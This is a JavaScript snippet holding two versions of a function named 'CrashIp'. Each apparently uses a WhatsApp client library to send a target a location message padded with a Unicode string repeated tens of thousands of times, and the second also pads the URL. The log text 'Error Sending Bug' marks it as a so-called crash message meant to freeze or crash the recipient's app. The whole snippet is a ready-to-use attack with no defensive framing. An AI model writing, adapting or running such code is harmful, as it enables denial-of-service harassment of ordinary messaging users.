async function CrashIp(target) {
    try {
        await client.relayMessage(target, {
            locationMessage: {
                degreesLatitude: 2.9990000000,
                degreesLongitude: -2.9990000000,
                name: "Hola\n" + "𑇂𑆵𑆴𑆿饝喛".repeat(80900),
                url: `https://Wa.me/stickerpack/Yukina`
            }
        }, {
            participant: {
                jid: target
            }
        });
    } catch (error) {
        console.error("Error Sending Bug:", error);
    }
}

async function CrashIp(target) {
    try {
        await client.relayMessage(target, {
            locationMessage: {
                degreesLatitude: 2.9990000000,
                degreesLongitude: -2.9990000000,
                name: "Hola\n" + "𑇂𑆵𑆴𑆿饝喛".repeat(80900),
                url: `https://` + `𑇂𑆵𑆴𑆿`.repeat(1817) + `.com`
            }
        }, {
            participant: {
                jid: target
            }
        });
    } catch (error) {
        console.error("Error Sending Bug:", error);
    }
      }
